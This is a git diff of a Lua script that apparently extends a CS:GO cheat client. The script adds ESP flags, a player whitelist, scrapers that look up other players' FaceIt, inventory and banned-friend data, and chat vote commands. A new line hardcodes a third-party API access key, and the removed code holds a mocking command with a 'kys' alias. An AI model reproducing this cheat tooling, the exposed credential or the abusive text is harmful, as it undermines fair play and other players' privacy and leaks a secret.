+									ReplaceData.user = Output.nickname
+									ReplaceData.country = Output.country
+									if ( Stats.lifetime ) then
+										Output.kdratio = Stats.lifetime[config_kdratio]
+										Output.winratio = Stats.lifetime[config_winratio]
+										Output.hschance = Stats.lifetime[config_hschance]
+										Output.matches = Stats.lifetime[config_matches]
+										ReplaceData.kdratio = Output.kdratio
+										ReplaceData.win = Output.winratio .. '%'
+										ReplaceData.hschance = Output.hschance
+										ReplaceData.matches = Output.matches
 									end
 
-									var_0_2.get("https://api.faceit.com/users/v1/nicknames/" .. var_163_1.nickname, function(arg_165_0, arg_165_1)
-										if not arg_165_0 then
-											return arg_161_3()
+									http.get('https://api.faceit.com/core/v1/nicknames/' .. Output.nickname, function(__success, __response)
+										if ( not __success ) then
+											return retry()
 										end
-
-										local var_165_0 = json.parse(arg_165_1.body)
-
-										if var_165_0 and var_165_0.result == "OK" then
-											if var_165_0.payload.games and var_165_0.payload.games.csgo then
-												var_164_5.level = var_165_0.payload.games.csgo.skill_level or 0
-												var_164_5.elo = var_165_0.payload.games.csgo.faceit_elo
+										local NicknameData = json.parse(__response.body)
+										if ( NicknameData and NicknameData.result == 'ok' ) then
+											ReplaceData.level = NicknameData.payload.csgo_skill_level or 0
+											if ( NicknameData.payload.games and NicknameData.payload.games.csgo ) then
+												ReplaceData.elo = NicknameData.payload.games.csgo.faceit_elo
 											end
-
-											local var_165_1 = {
-												server = processTags("{name} has a level {level} FaceIt Account ({user})!", var_164_5),
-												lobby = processTags("{name} - Level: {level} - User: {user}!", var_164_5)
-											}
-
-											arg_161_2(var_165_1)
+											local data = {}
+											data.server = processTags('{name} has a level {level} FaceIt Account ({user})!', ReplaceData)
+											data.lobby = processTags('{name} - Level: {level} - User: {user}!', ReplaceData)
+											next(data)
 										end
 									end)
 								end
 							end)
 						else
-							var_10_0.ChatMethods["Local Chat"](" \a[" .. arg_161_5.name .. "] \n" .. arg_161_1 .. "'s account was not found on FaceIT!")
-							arg_161_2()
+							CPLua.ChatMethods['Local Chat'](' \x07[' .. TypeMT.name .. '] \x0A' .. name .. '\'s account was not found on FaceIT!')
+							next()
 						end
 					else
-						arg_161_3("No Fucking Clue, dm csmit195#4729 if error persists")
+						retry('No Fucking Clue, dm csmit195#4729 if error persists')
 					end
 				end)
 			end)
 		end
+		--#endregion
 
-		if var_0_18.get("Inventory Value") then
-			local var_10_28
-			local var_10_29 = {
-				"",
-				"https://api.codetabs.com/v1/proxy/?quest=",
-				"https://thingproxy.freeboard.io/fetch/"
-			}
-			local var_10_30 = 1
-
-			local function var_10_31()
-				var_10_30 = var_10_30 + 1
-
-				if var_10_30 > #var_10_29 then
-					var_10_30 = 1
-				end
-
-				print("new proxy: ", var_10_30, " : ", var_10_29[var_10_30])
-			end
-
-			var_10_23.new("Inventory Value", "Inventory", function(arg_167_0, arg_167_1, arg_167_2, arg_167_3, arg_167_4, arg_167_5)
-				if not var_10_28 then
-					var_0_2.get("http://csgobackpack.net/api/GetItemsList/v2/?no_details=1&details=0", {
-						absolute_timeout = 300,
-						network_timeout = 300
-					}, function(arg_168_0, arg_168_1)
-						if not arg_168_0 then
-							return
-						end
-
+		--#region Inventory Value
+		if ( Feature.get('Inventory Value') ) then
+			local InventoryPrices			
+			Checkers.new('Inventory Value', 'Inventory', function(steamid, name, next, retry, TypeMT)
+				if ( not InventoryPrices ) then
+					http.get('http://csgobackpack.net/api/GetItemsList/v2/?no_details=1&details=0', {network_timeout=300, absolute_timeout=300}, function(success, response)
+						if not success then return end
 						client.delay_call(1, function()
-							var_10_28 = json.parse(arg_168_1.body)
-
-							client.delay_call(1, arg_167_3)
+							InventoryPrices = json.parse(response.body)
+							client.delay_call(1, retry)
 						end)
 					end)
-
 					return
 				end
 
-				var_0_2.get("https://steamcommunity.com/profiles/" .. arg_167_0 .. "/inventory/", function(arg_170_0, arg_170_1)
-					if not arg_170_0 or not arg_170_1.body then
-						return arg_167_3()
+				http.get('https://steamcommunity.com/profiles/' .. steamid .. '/inventory/', function(success_, response_)
+					if not success_ or not response_.body then return retry() end
+					
+					local PrivateProfile = response_.body:match('<div class="profile_private_info">') ~= nil
+					local IsInventoryPrivate = response_.body:match("'s inventory is currently private.") ~= nil
+					
+					if ( PrivateProfile or IsInventoryPrivate ) then
+						local data = {}
+						data.localchat = name .. '\'s ' .. ( PrivateProfile and 'profile' or 'inventory' ) .. ' is private'
+						data.lobby = data.localchat
+						return next(data)
 					end
 
-					local var_170_0 = arg_170_1.body:match("<div class=\"profile_private_info\">") ~= nil
-					local var_170_1 = arg_170_1.body:match("'s inventory is currently private.") ~= nil
-
-					if var_170_0 or var_170_1 then
-						local var_170_2 = {
-							localchat = arg_167_1 .. "'s " .. (var_170_0 and "profile" or "inventory") .. " is private"
-						}
-
-						var_170_2.lobby = var_170_2.localchat
-
-						return arg_167_2(var_170_2)
-					end
-
-					print("requesting: ", var_10_29[var_10_30] .. "https://steamcommunity.com/profiles/" .. arg_167_0 .. "/inventory/json/730/2")
-					var_0_2.get(var_10_29[var_10_30] .. "https://steamcommunity.com/profiles/" .. arg_167_0 .. "/inventory/json/730/2", function(arg_171_0, arg_171_1)
-						if not arg_171_0 or not arg_171_1.body then
-							var_10_31()
-
-							return arg_167_3()
-						end
-
-						local var_171_0 = json.parse(arg_171_1.body)
-
-						if var_171_0 and type(var_171_0) ~= "userdata" and arg_171_1.body then
-							if not var_171_0.success then
-								var_10_31()
-
-								return client.delay_call(5, arg_167_3)
-							end
-
-							local var_171_1 = {}
-							local var_171_2 = 0
-
-							for iter_171_0, iter_171_1 in pairs(var_171_0.rgDescriptions) do
-								if iter_171_1.marketable == 1 then
-									local var_171_3 = var_10_28.items_list[iter_171_1.market_hash_name]
-									local var_171_4 = var_171_3 and var_171_3.price and (var_171_3.price["30_days"] or var_171_3.price.all_time)
-
-									if var_171_4 then
-										var_171_2 = var_171_2 + var_171_4.median
+					http.get('http://api.scrapestack.com/scrape?access_key=bea445d544a3c87883d8af2cf83ab498&url=https://steamcommunity.com/profiles/' .. steamid .. '/inventory/json/730/2', function(success, response)
+						if not success or not response.body then return retry() end
+						
+						local jsonData = json.parse(response.body)
+						if ( jsonData and type(jsonData) ~= 'userdata' and response.body ) then
+							if not jsonData.success then return client.delay_call(5, retry) end
+							
+							local MarketableItems = {}
+							local Total = 0
+							for i, Item in pairs(jsonData.rgDescriptions) do
+								if ( Item.marketable == 1 ) then
+									local ItemData = InventoryPrices.items_list[Item.market_hash_name]
+									local Price = ItemData and ItemData.price and ( ItemData.price['30_days'] or ItemData.price['all_time'] )
+									if ( Price ) then
+										Total = Total + Price.median
 									end
 								end
 							end
-
-							local var_171_5 = {
-								server = arg_167_1 .. "'s inventory value is worth $" .. string.format("%.2f", var_171_2) .. "USD",
-								lobby = arg_167_1 .. " - Value: $" .. string.format("%.2f", var_171_2) .. "USD"
-							}
-
-							arg_167_2(var_171_5)
+							
+							local data = {}
+							data.server = name .. '\'s inventory value is worth $' .. string.format('%.2f', Total) .. 'USD'
+							data.lobby = name .. ' - Value: $' .. string.format('%.2f', Total) .. 'USD'
+							next(data)
 						else
-							var_10_31()
-							arg_167_3()
+							client.delay_call(5, retry)
 						end
 					end)
 				end)
 			end)
-		end
 
-		if var_0_18.get("Game Value") then
-			var_10_23.new("Game Value", "Games", function(arg_172_0, arg_172_1, arg_172_2, arg_172_3, arg_172_4, arg_172_5)
-				var_0_2.get("https://steamid.pro/lookup/" .. arg_172_0, function(arg_173_0, arg_173_1)
-					if not arg_173_0 or arg_173_1.status ~= 200 then
-						return arg_172_3("error checking " .. arg_172_0)
+			--[[ Old Version
+			local BeenBefore = {}
+			Checkers.new('Inventory Value', 'Inventory', function(steamid, name, next, retry, TypeMT)
+				http.get('https://steamcommunity.com/profiles/' .. steamid .. '/inventory/', function(success_, response_)
+					local PrivateProfile = response_.body:match('<div class="profile_private_info">') ~= nil
+					local IsInventoryPrivate = response_.body:match("'s inventory is currently private.") ~= nil
+					
+					if ( PrivateProfile or IsInventoryPrivate ) then
+						local data = {}
+						data.server = name .. '\'s ' .. ( PrivateProfile and 'profile' or 'inventory' ) .. ' is private'
+						data.lobby = data.server
+						return next(data)
+					end
+					
+					client.delay_call(1, function()
+						http.get('https://csgobackpack.net/index.php?nick='.. steamid .. '&currency=USD' .. (BeenBefore[steamid] and '' or '&ref=1'), {['network_timeout'] = 160, ['absolute_timeout'] = 300} ,function(success, response)
+							if response.status ~= 200 then
+								return retry(steamid .. '(' .. name .. ') caused an unexpected error')
+							end
+			
+							BeenBefore[steamid] = true
+				
+							if ( response and response.body and not response.body:find("<h3><font color='#a94847'>This profile is private</font></h3>") ) then
+								local Value = response.body:match('<h3>In total\n?<p>%$(%d+.%d%d?)')
+								if ( Value ) then
+									local data = {}
+									data.server = name .. '\'s inventory value is worth $' .. Value .. 'USD'
+									data.lobby = name .. ' - Value: $' .. Value .. 'USD'
+									next(data)
+								else
+									next('unexpected error, no value found for ' .. steamid .. ' retrying!')
+								end
+							end
+						end)
+					end)
+				end)
+			end)]]
+		end
+		--#endregion
+
+		--#region Game Value
+		if ( Feature.get('Game Value') ) then
+			Checkers.new('Game Value', 'Games', function(steamid, name, next, retry, TypeMT)
+				http.get('https://steamid.pro/lookup/'..steamid, function(success, response)
+					if not success or response.status ~= 200 then
+						return retry('error checking ' .. steamid)
 					end
 
-					local var_173_0 = arg_173_1.body:match("<span class=\"number%-price\">$(%d+)</span>")
-
-					if var_173_0 then
-						local var_173_1 = {
-							server = arg_172_1 .. "'s account is worth $" .. var_173_0 .. "!"
-						}
-
-						arg_172_2(var_173_1)
+					local Value = response.body:match('<span class="number%-price">$(%d+)</span>')
+					if ( Value ) then
+						local data = {}
+						data.server = name .. '\'s account is worth $' .. Value .. '!'
+						next(data)
 					else
-						arg_172_3("no price found, wtf? dm csmit195#4729 if the error persists.")
+						retry('no price found, wtf? dm csmit195#4729 if the error persists.')
 					end
 				end)
 			end)
 		end
+		--#endregion
 
-		var_10_23.new("Live Checker", "Games", function(arg_174_0, arg_174_1, arg_174_2, arg_174_3, arg_174_4, arg_174_5)
-			LiveCheck:start(arg_174_0, function(arg_175_0, arg_175_1)
-				local var_175_0 = {}
-
-				if var_175_0 then
-					var_175_0.server = "[LiveCheck] " .. arg_174_0 .. " == " .. arg_175_1.state
-				else
-					var_175_0.server = "[LiveCheck] " .. arg_174_0 .. " == No response"
-				end
-
-				arg_174_2(var_175_0)
-			end)
-		end)
-
-		if var_0_18.get("Banned Friends") then
-			var_10_23.new("Banned Friends", "Banned", function(arg_176_0, arg_176_1, arg_176_2, arg_176_3, arg_176_4, arg_176_5)
-				var_0_2.get("https://steamcommunity.com/profiles/" .. arg_176_0 .. "/friends/", function(arg_177_0, arg_177_1)
-					if not arg_177_0 or arg_177_1.status ~= 200 then
-						return arg_176_3("failed to check " .. arg_176_0 .. "'s friends, dm csmit195#4729 if error persists")
+		--#region Banned Friends Checker
+		if ( Feature.get('Banned Friends') ) then
+			Checkers.new('Banned Friends', 'Banned', function(steamid, name, next, retry, TypeMT)
+				http.get('https://steamcommunity.com/profiles/' .. steamid .. '/friends/', function(success, response)
+					if not success or response.status ~= 200 then
+						return retry('failed to check ' .. steamid ..'\'s friends, dm csmit195#4729 if error persists')
 					end
 
-					local var_177_0 = {}
-
-					for iter_177_0 in arg_177_1.body:gmatch("data%-steamid=\"(%d+)\"") do
-						var_177_0[#var_177_0 + 1] = iter_177_0
+					local SteamIDS = {}
+					for SteamID in response.body:gmatch([[data%-steamid="(%d+)"]]) do
+						SteamIDS[#SteamIDS + 1] = SteamID
 					end
 
-					local var_177_1 = {}
-
-					for iter_177_1, iter_177_2 in ipairs(var_177_0) do
-						local var_177_2 = math.floor(iter_177_1 / 100) + 1
-
-						var_177_1[var_177_2] = var_177_1[var_177_2] or {}
-						var_177_1[var_177_2][#var_177_1[var_177_2] + 1] = iter_177_2
+					local Groups = {}
+					for index, SteamID in ipairs(SteamIDS) do
+						local Group = math.floor(index / 100)+1
+						Groups[Group] = Groups[Group] or {}
+						Groups[Group][#Groups[Group] + 1] = SteamID
 					end
 
-					if #var_177_1 == 0 then
-						return arg_176_2()
-					end
-
-					local var_177_3 = 0
-					local var_177_4 = 0
-					local var_177_5 = false
-
-					for iter_177_3, iter_177_4 in ipairs(var_177_1) do
-						local var_177_6 = table.concat(iter_177_4, ",")
-
-						var_0_2.get("https://api.steampowered.com/ISteamUser/GetPlayerBans/v1/?key=" .. RandomWebKey() .. "&steamids=" .. var_177_6, function(arg_178_0, arg_178_1)
-							if not arg_178_0 or arg_178_1.status ~= 200 or var_177_5 then
-								var_177_5 = true
-
-								return arg_176_3("unknown error, retrying")
+					if ( #Groups == 0 ) then return next() end
+					
+					local Checked = 0
+					local BannedCount = 0
+					local Retry = false
+					for GroupIndex, Group in ipairs(Groups) do
+						local steamidStr = table.concat(Group, ',')
+						http.get('https://api.steampowered.com/ISteamUser/GetPlayerBans/v1/?key=' .. RandomWebKey() .. '&steamids=' .. steamidStr, function(success, response)
+							if not success or response.status ~= 200 or Retry then
+								Retry = true
+								return retry('unknown error, retrying')
 							end
-
-							local var_178_0 = json.parse(arg_178_1.body)
-
-							if var_178_0 and var_178_0.players then
-								for iter_178_0, iter_178_1 in ipairs(var_178_0.players) do
-									var_177_3 = var_177_3 + 1
-
-									if iter_178_1.NumberOfVACBans > 0 or iter_178_1.NumberOfGameBans > 0 then
-										var_177_4 = var_177_4 + 1
+							local jsonData = json.parse(response.body)
+							if ( jsonData and jsonData.players ) then
+								for index, Player in ipairs(jsonData.players) do
+									Checked = Checked + 1
+									if ( Player.NumberOfVACBans > 0 or Player.NumberOfGameBans > 0 ) then
+										BannedCount = BannedCount + 1
 									end
-
-									if var_177_3 == #var_177_0 then
-										local var_178_1 = {
-											server = arg_176_1 .. " has " .. var_177_4 .. "/" .. #var_177_0 .. " banned friends!",
-											lobbychat = arg_176_1 .. " - " .. var_177_4 .. "/" .. #var_177_0 .. " banned friends!"
-										}
-
-										arg_176_2(var_178_1)
+									
+									if ( Checked == #SteamIDS ) then
+										local data = {}
+										data.server = name .. ' has ' .. BannedCount .. '/' .. #SteamIDS .. ' banned friends!'
+										data.lobbychat = name .. ' - ' .. BannedCount .. '/' .. #SteamIDS  .. ' banned friends!'
+										next(data)
 									end
 								end
 							end
@@ -2791,2776 +2999,633 @@ function Initiate()
 				end)
 			end)
 		end
+		--#endregion
 
-		local function var_10_32(arg_179_0)
-			local var_179_0 = {}
-			local var_179_1 = 0
-			local var_179_2 = var_0_17.GetFriendPersonaNameHistory(arg_179_0, var_179_1)
-
-			if var_179_2 ~= "" then
+		--#region Name History
+		local function GetNameHistory(SteamID)
+			local Names = {}
+			local Index = 0
+			local Name = ISteamFriends.GetFriendPersonaNameHistory(SteamID, Index)
+			if Name ~= '' then
 				repeat
-					var_179_0[#var_179_0 + 1] = var_179_2
-					var_179_1 = var_179_1 + 1
-					var_179_2 = var_0_17.GetFriendPersonaNameHistory(arg_179_0, var_179_1)
-				until var_179_2 == ""
+					Names[#Names + 1] = Name                                                                                            
+					Index = Index + 1
+					Name = ISteamFriends.GetFriendPersonaNameHistory(SteamID, Index)
+				until Name == ''
 			end
-
-			return var_179_0
+			return Names
 		end
 
-		if var_0_18.get("Name History") then
-			var_10_23.new("Name History", "Names", function(arg_180_0, arg_180_1, arg_180_2, arg_180_3, arg_180_4, arg_180_5)
-				local var_180_0 = var_10_32(arg_180_0)
-
-				if #var_180_0 > 0 then
-					local var_180_1 = {
-						server = table.concat(var_180_0, ", ")
-					}
-
-					var_180_1.lobby = var_180_1.server
-
-					arg_180_2(var_180_1)
+		if ( Feature.get('Name History') ) then
+			Checkers.new('Name History', 'Names', function(steamid, name, next, retry, TypeMT)
+				local History = GetNameHistory(steamid)
+				if ( #History > 0 ) then
+					local data = {}
+					data.server = table.concat(History, ', ')
+					data.lobby = data.server
+					next(data)
 				else
-					arg_180_2()
+					next()
 				end
 			end)
 		end
+		--#endregion
 
-		var_10_23.enable = ui.new_checkbox("Lua", "B", "Account Checkers")
+		--#endregion
 
-		local var_10_33 = {}
-
-		for iter_10_4, iter_10_5 in ipairs(var_10_23.registered) do
-			var_10_33[#var_10_33 + 1] = iter_10_5.name
+		Checkers.enable = ui.new_checkbox('Lua', 'B', 'Account Checkers')
+		local Items = {}
+		for i, RegisteredItem in ipairs(Checkers.registered) do
+			Items[#Items + 1] = RegisteredItem.name
 		end
+		if ( #Items == 0 ) then Items = {'Empty...'} end -- DEBUG ADD
+		
+		Checkers.type = ui.new_combobox('Lua', 'B', 'Type', Items)
+		Checkers.target = ui.new_combobox('Lua', 'B', 'Target', {'Everyone', 'Teammates', 'Enemies'})
+		Checkers.output = ui.new_combobox('Lua', 'B', 'Output', {'Local Chat', 'Party Chat', 'Game Chat', 'Team Chat', 'Console'})
+		ui.set(Checkers.output, 'Local Chat')
 
-		if #var_10_33 == 0 then
-			var_10_33 = {
-				"Empty..."
-			}
-		end
+		Checkers.status = ui.new_label('Lua', 'B', 'Status: Idle...')
+		Checkers.check = ui.new_button('Lua', 'B', 'Check', Checkers._StartBTN)
 
-		var_10_23.type = ui.new_combobox("Lua", "B", "Type", var_10_33)
-		var_10_23.target = ui.new_combobox("Lua", "B", "Target", {
-			"Everyone",
-			"Teammates",
-			"Enemies"
-		})
-		var_10_23.output = ui.new_combobox("Lua", "B", "Output", {
-			"Local Chat",
-			"Party Chat",
-			"Game Chat",
-			"Team Chat",
-			"Console"
-		})
+		ui.set_visible(Checkers.type, false)
+		ui.set_visible(Checkers.target, false)
+		ui.set_visible(Checkers.output, false)
+		ui.set_visible(Checkers.status, false)
+		ui.set_visible(Checkers.check, false)
+		ui.set_callback(Checkers.enable, function(Elem)
+			local State = ui.get(Elem)
 
-		ui.set(var_10_23.output, "Local Chat")
-
-		var_10_23.status = ui.new_label("Lua", "B", "Status: Idle...")
-		var_10_23.check = ui.new_button("Lua", "B", "Check", var_10_23._StartBTN)
-
-		ui.set_visible(var_10_23.type, false)
-		ui.set_visible(var_10_23.target, false)
-		ui.set_visible(var_10_23.output, false)
-		ui.set_visible(var_10_23.status, false)
-		ui.set_visible(var_10_23.check, false)
-		ui.set_callback(var_10_23.enable, function(arg_181_0)
-			local var_181_0 = ui.get(arg_181_0)
-
-			ui.set_visible(var_10_23.type, var_181_0)
-			ui.set_visible(var_10_23.target, var_181_0)
-			ui.set_visible(var_10_23.output, var_181_0)
-			ui.set_visible(var_10_23.status, var_181_0)
-			ui.set_visible(var_10_23.check, var_181_0)
+			ui.set_visible(Checkers.type, State)
+			ui.set_visible(Checkers.target, State)
+			ui.set_visible(Checkers.output, State)
+			ui.set_visible(Checkers.status, State)
+			ui.set_visible(Checkers.check, State)
 		end)
 	end
+	--#endregion
 
-	if var_0_18.get("Whitelist Friends on Key") then
-		var_10_0.WhitelistLegitsOnKey = {}
-		var_10_0.WhitelistLegitsOnKey.enable = ui.new_checkbox("Lua", "B", "Whitelist Legits on key")
-		var_10_0.WhitelistLegitsOnKey.hotkey = ui.new_hotkey("Lua", "B", "Whitelist Legits on key", true)
+	--#region Whitelist Legits on Key
+	if ( Feature.get('Whitelist Friends on Key') ) then
+		CPLua.WhitelistLegitsOnKey = {}
+		CPLua.WhitelistLegitsOnKey.enable = ui.new_checkbox('Lua', 'B', 'Whitelist Legits on key')
+		CPLua.WhitelistLegitsOnKey.hotkey = ui.new_hotkey('Lua', 'B', 'Whitelist Legits on key', true)
 
-		client.set_event_callback("run_command", function()
-			local var_182_0, var_182_1 = ui.get(var_10_0.WhitelistLegitsOnKey.hotkey)
+		client.set_event_callback('run_command', function()
+			local KeyState, Key = ui.get(CPLua.WhitelistLegitsOnKey.hotkey)
 
-			for iter_182_0, iter_182_1 in ipairs(entity.get_players(true)) do
-				if var_0_21 and var_0_21.cache and var_0_21.cache[iter_182_1] and var_0_21.cache[iter_182_1][var_0_21.MarkAsLegit] then
-					plist.set(iter_182_1, "Add to whitelist", ui.get(var_10_0.WhitelistLegitsOnKey.enable) and var_182_0 and var_0_21.cache[iter_182_1][var_0_21.MarkAsLegit])
+			for i, Entity in ipairs(entity.get_players(true)) do
+				if ( PListAdditions and PListAdditions.cache and PListAdditions.cache[Entity] and PListAdditions.cache[Entity][PListAdditions.MarkAsLegit] ) then
+					plist.set(Entity, 'Add to whitelist', ui.get(CPLua.WhitelistLegitsOnKey.enable) and KeyState and PListAdditions.cache[Entity][PListAdditions.MarkAsLegit])
 				end
 			end
 		end)
-		client.register_esp_flag("WHITELISTED", 255, 255, 255, function(arg_183_0)
-			local var_183_0, var_183_1 = ui.get(var_10_0.WhitelistLegitsOnKey.hotkey)
 
-			if var_0_21 and var_0_21.cache and var_0_21.cache[arg_183_0] and var_0_21.cache[arg_183_0][var_0_21.MarkAsLegit] then
-				return ui.get(var_10_0.WhitelistLegitsOnKey.enable) and var_183_0 and var_0_21.cache[arg_183_0][var_0_21.MarkAsLegit]
+		client.register_esp_flag('WHITELISTED', 255, 255, 255, function(Entity)
+			local KeyState, Key = ui.get(CPLua.WhitelistLegitsOnKey.hotkey)
+			if ( PListAdditions and PListAdditions.cache and PListAdditions.cache[Entity] and PListAdditions.cache[Entity][PListAdditions.MarkAsLegit] ) then
+				return ui.get(CPLua.WhitelistLegitsOnKey.enable) and KeyState and PListAdditions.cache[Entity][PListAdditions.MarkAsLegit]
 			end
-
 			return false
 		end)
 	end
+	--#endregion
 
-	if var_0_18.get("Chat Commands") then
-		var_10_0.ChatCommands = {}
-		var_10_0.ChatCommands.enable = ui.new_checkbox("Lua", "B", "In-game Chat Commands")
+	--#region Party Chat Utilities
+	if ( Feature.get('Party Chat Utils') ) then
+		CPLua.PartyChatUtils = {}
+		CPLua.PartyChatUtils.enable = ui.new_checkbox('Lua', 'B', 'Party Chat Utilities')
 
-		ui.set_callback(var_10_0.ChatCommands.enable, function(arg_184_0)
-			local var_184_0 = ui.get(arg_184_0)
+		ui.set(CPLua.PartyChatUtils.enable, true)
 
-			ui.set_visible(var_10_0.ChatCommands.commands, var_184_0)
-		end)
-
-		local var_10_34 = {}
-
-		function var_10_34.register(arg_185_0, arg_185_1, arg_185_2, arg_185_3)
-			local var_185_0 = {
-				name = arg_185_0,
-				desc = arg_185_1,
-				alias = arg_185_2,
-				exec = arg_185_3
-			}
-
-			var_10_34.commands = var_10_34.commands or {}
-			var_10_34.commands[#var_10_34.commands + 1] = var_185_0
-
-			return var_185_0
-		end
-
-		local var_10_35 = {}
-
-		function var_10_35.register(arg_186_0, arg_186_1)
-			local var_186_0 = {
-				name = arg_186_0,
-				hex = arg_186_1
-			}
-
-			var_10_35.colors = var_10_35.colors or {}
-			var_10_35.colors[#var_10_35.colors + 1] = var_186_0
-
-			return var_186_0
-		end
-
-		function var_10_35.fromHex(arg_187_0, arg_187_1)
-			local var_187_0 = arg_187_1:gsub("#", "")
-
-			for iter_187_0, iter_187_1 in ipairs(var_10_35.colors) do
-				local var_187_1 = iter_187_1.hex:gsub("#", "")
-
-				if var_187_0:lower() == var_187_0:lower() then
-					return iter_187_1
-				end
-			end
-		end
-
-		function var_10_35.fromName(arg_188_0, arg_188_1)
-			for iter_188_0, iter_188_1 in ipairs(var_10_35.colors) do
-				if iter_188_1.name:lower() == arg_188_1:lower() then
-					return iter_188_1
-				end
-			end
-		end
-
-		var_10_35.register("yellow", "#F8F62D")
-		var_10_35.register("purple", "#A119F0")
-		var_10_35.register("green", "#00B562")
-		var_10_35.register("blue", "#5CA8FF")
-		var_10_35.register("orange", "#FF9B25")
-
-		local function var_10_36(arg_189_0)
-			if not arg_189_0 or type(arg_189_0) ~= "string" or type(arg_189_0) ~= "number" then
-				return
-			end
-
-			local var_189_0
-
-			if tonumber(arg_189_0) then
-				local var_189_1 = client.userid_to_entindex(arg_189_0)
-
-				if var_189_1 then
-					var_189_0 = var_189_1
-				end
-			end
-
-			local var_189_2 = var_10_35:fromName(arg_189_0)
-
-			for iter_189_0 = 1, globals.maxplayers() do
-				local var_189_3 = var_0_9.GetPlayerXuidStringFromEntIndex(iter_189_0)
-				local var_189_4 = var_0_9.GetPlayerColor(var_189_3)
-
-				if var_189_2 and var_10_35:fromHex(var_189_4) == var_189_2 then
-					var_189_0 = iter_189_0
-
-					break
-				end
-
-				if entity.get_player_name(iter_189_0):lower():find(arg_189_0:lower()) then
-					var_189_0 = iter_189_0
-
-					break
-				end
-			end
-
-			if var_189_0 then
-				local var_189_5 = var_0_9.GetLocalPlayerXuid()
-				local var_189_6 = {
-					xuid = var_0_9.GetPlayerXuidStringFromEntIndex(var_189_0),
-					entid = var_189_0,
-					name = entity.get_player_name(var_189_0),
-					enemy = var_0_9.ArePlayersEnemies(var_189_5, SteamXUID)
-				}
-
-				var_189_6.color = var_0_9.GetPlayerColor(var_189_6.xuid)
-
-				return var_189_6
-			end
-		end
-
-		var_10_34.register("kick", "call vote kick", {
-			"kick",
-			"k",
-			"votekick",
-			"vk"
-		}, function(arg_190_0, arg_190_1, arg_190_2)
-			local var_190_0 = var_10_36(arg_190_2[1])
-
-			print("test", var_190_0)
-
-			if var_190_0 then
-				local var_190_1 = getPlayerInfo(var_190_0.entid)
-
-				print("hello...")
-				client.exec("callvote ", "kick ", var_190_1.userid)
-			end
-		end)
-		var_10_34.register("mute", "mutes the player", {
-			"mute",
-			"m",
-			"silence",
-			"ignore",
-			"i",
-			"block"
-		}, function(arg_191_0, arg_191_1, arg_191_2)
-			local var_191_0 = var_10_36(arg_191_2[1])
-
-			if var_191_0 then
-				var_0_9.ToggleMute(var_191_0.xuid)
-			end
-		end)
-		var_10_34.register("map", "calls map vote", {
-			"map",
-			"m",
-			"votemap",
-			"vm"
-		}, function(arg_192_0, arg_192_1, arg_192_2)
-			print("test", arg_192_2[1])
-
-			if arg_192_2[1] then
-				client.exec("callvote ", "ChangeLevel ", arg_192_2[1])
-			end
-		end)
-		var_10_34.register("timeout", "calls timeout", {
-			"timeout",
-			"pause",
-			"t",
-			"p",
-			"calltimeout"
-		}, function(arg_193_0, arg_193_1, arg_193_2)
-			client.exec("callvote ", "StartTimeOut")
-		end)
-		var_10_34.register("surrender", "calls surrender", {
-			"forfeit",
-			"ff",
-			"surrender",
-			"surr",
-			"giveup",
-			"kms",
-			"kys"
-		}, function(arg_194_0, arg_194_1, arg_194_2)
-			client.exec("callvote ", "Surrender")
-		end)
-		var_10_34.register("gay", "checks gay status", {
-			"gay"
-		}, function(arg_195_0, arg_195_1, arg_195_2)
-			return arg_195_1 .. " is " .. (math.random(1, 2) == 1 and "gay" or "not gay") .. "!"
-		end)
-		var_10_34.register("techtimeout", "leaves for 1 min 45s", {
-			"techtimeout",
-			"tt"
-		}, function(arg_196_0, arg_196_1, arg_196_2)
-			if var_0_8.HasOngoingMatch() then
-				client.exec("disconnect")
-				client.delay_call(105, function()
-					var_0_8.ActionReconnectToOngoingMatch()
-				end)
-			end
-		end)
-
-		local var_10_37 = {}
-		local var_10_38 = {}
-		local var_10_39 = {}
-
-		for iter_10_6, iter_10_7 in ipairs(var_10_34.commands) do
-			local var_10_40 = "!" .. iter_10_7.name .. " - " .. iter_10_7.desc
-
-			var_10_37[#var_10_37 + 1] = var_10_40
-			var_10_38[iter_10_7.name] = var_10_40
-			var_10_39[var_10_40] = iter_10_7.name
-		end
-
-		var_10_0.ChatCommands.commands = ui.new_multiselect("Lua", "B", "\n", var_10_37)
-
-		ui.set(var_10_0.ChatCommands.commands, {
-			var_10_38.timeout,
-			var_10_38.gay
-		})
-		ui.set_visible(var_10_0.ChatCommands.commands, false)
-		client.set_event_callback("player_chat", function(arg_198_0)
-			if not ui.get(var_10_0.ChatCommands.enable) then
-				return
-			end
-
-			local var_198_0 = arg_198_0.entity
-			local var_198_1 = arg_198_0.name
-			local var_198_2 = arg_198_0.text
-			local var_198_3 = entity.get_local_player()
-			local var_198_4, var_198_5 = string.match(var_198_2, "^!(%w+)[%s]?(.*)$")
-
-			if var_198_4 ~= nil then
-				local var_198_6 = {}
-
-				for iter_198_0 in var_198_5:gmatch("%S+") do
-					table.insert(var_198_6, iter_198_0)
-				end
-
-				local var_198_7 = {}
-
-				for iter_198_1, iter_198_2 in ipairs(ui.get(var_10_0.ChatCommands.commands)) do
-					var_198_7[var_10_39[iter_198_2]] = true
-				end
-
-				for iter_198_3, iter_198_4 in ipairs(var_10_34.commands) do
-					if var_198_7[iter_198_4.name] then
-						for iter_198_5, iter_198_6 in ipairs(iter_198_4.alias) do
-							if iter_198_6 == var_198_4:lower() then
-								local var_198_8 = iter_198_4.exec(var_198_0, var_198_1, var_198_6)
-								local var_198_9 = 0
-
-								if var_198_3 == var_198_0 then
-									var_198_9 = 0.75
-								end
-
-								client.delay_call(var_198_9, function()
-									MessageQueue:Say(var_198_8)
-								end)
-
-								break
-							end
-						end
-					end
-				end
-			end
-		end)
-	end
-
-	if var_0_18.get("Party Chat Utils") then
-		var_10_0.PartyChatUtils = {}
-		var_10_0.PartyChatUtils.enable = ui.new_checkbox("Lua", "B", "In-lobby Chat Commands")
-
-		ui.set(var_10_0.PartyChatUtils.enable, true)
-
-		local function var_10_41()
-			if ui.get(var_10_0.PartyChatUtils.enable) then
+		local function PartyChatLoop()
+			if ( ui.get(CPLua.PartyChatUtils.enable) ) then
 				CPPanoramaMainMenu.PartyChatLoop()
 			end
-
-			client.delay_call(0.25, var_10_41)
+			client.delay_call(0.25, PartyChatLoop)
 		end
 
-		var_10_41()
+		PartyChatLoop()
 	end
+	--#endregion
 
-	var_10_0.DebugOptions = {}
-	var_10_0.DebugOptions.enable = ui.new_checkbox("Lua", "B", "Debug Mode (console)")
-
-	ui.set_callback(var_10_0.DebugOptions.enable, function(arg_201_0)
-		local var_201_0 = ui.get(arg_201_0)
-
